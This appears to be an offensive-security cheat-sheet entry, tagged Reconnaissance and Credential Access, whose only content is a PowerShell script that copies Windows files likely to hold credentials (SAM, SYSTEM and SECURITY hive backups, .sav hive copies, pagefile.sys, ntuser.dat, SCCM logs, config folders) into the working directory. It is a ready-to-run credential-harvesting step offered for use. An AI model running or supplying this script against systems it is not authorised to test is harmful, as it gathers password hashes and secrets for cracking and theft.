# Copy Common Windows Files containing creds/credentials to your current directory

OS: Windows
Description: Copy a list of common files containing credentials to your current directory
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
# Define file paths
$filesToCopy = @(
    "$env:SystemDrive\pagefile.sys",
    "$env:Windir\debug\NetSetup.log",
    "$env:Windir\repair\sam",
    "$env:Windir\repair\system",
    "$env:Windir\repair\software",
    "$env:Windir\repair\security",
    "$env:Windir\iis6.log",
    "$env:Windir\system32\config\AppEvent.Evt",
    "$env:Windir\system32\config\SecEvent.Evt",
    "$env:Windir\system32\config\default.sav",
    "$env:Windir\system32\config\security.sav",
    "$env:Windir\system32\config\software.sav",
    "$env:Windir\system32\config\system.sav",
    "$env:Windir\system32\CCM\logs\*.log",
    "$env:UserProfile\ntuser.dat",
    "$env:UserProfile\Local Settings\Temporary Internet Files\Content.IE5\index.dat",
    "$env:Windir\System32\drivers\etc\hosts",
    "C:\ProgramData\Configs\*",
    "C:\Program Files\Windows PowerShell\*"
)

# Get the current directory
$destination = Get-Location

# Loop through and copy files/folders
foreach ($file in $filesToCopy) {
    if (Test-Path -Path $file) {
        try {
            Copy-Item -Path $file -Destination $destination -Recurse -Force -ErrorAction Stop
            Write-Host "Copied: $file"
        } catch {
            Write-Host "Failed to copy: $file. Error: $_" -ForegroundColor Red
        }
    } else {
        Write-Host "File/Folder not found: $file" -ForegroundColor Yellow
    }
}

Write-Host "All tasks completed."

```